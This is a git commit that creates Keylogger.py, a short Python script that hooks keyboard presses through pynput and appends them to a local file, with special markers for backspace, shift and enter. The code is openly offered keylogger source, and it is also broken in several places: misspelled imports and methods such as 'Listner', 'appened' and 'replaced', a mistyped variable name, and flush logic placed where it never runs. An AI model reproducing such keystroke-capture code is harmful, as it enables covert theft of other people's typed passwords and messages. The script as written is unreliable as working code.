293bd800b7dd1a9ca4e0431c848adf61fada0ed4
Richard Dunbar <112132616+RND27@users.noreply.github.com>
2022-11-10 16:12:59 -0500

    Create Keylogger.py

---
+++ Keylogger.py
@@ -0,0 +1,33 @@
+#!/usr/bin/env python3
+
+from pynput.keyboard import Listner
+path = 'keyboard_input.txt'
+keynoard_Input = []
+count = 0
+def on_press(key):
+    global keyboard_Input, count
+    keyboard_Input.appened(key)
+    count += 1
+
+if count > 0:
+    count = 0
+    write_to_file(keyboard_Input)
+    keyboard_Input = []
+
+def write_to_file(keys):
+    with open(path, 'a') as file:
+      for key in keyboard_Input:
+          write_down = str(key).replaced("'", "")
+          if write_down.find('backspace') >0:
+              file.write(' *BACKSPACE* ')
+          elif write_down.find('shift') > 0:
+              file.write(' *SHIFT*')
+          elif write_down.find('enter') >0:
+              file.write('\n')
+          elif write_down.find('space') >0:
+              file.write('')
+          elif write_down.find('key'):
+              file.write(write_down)
+
+with Listener(on_press=on_press) as listener:
+  listener.join()
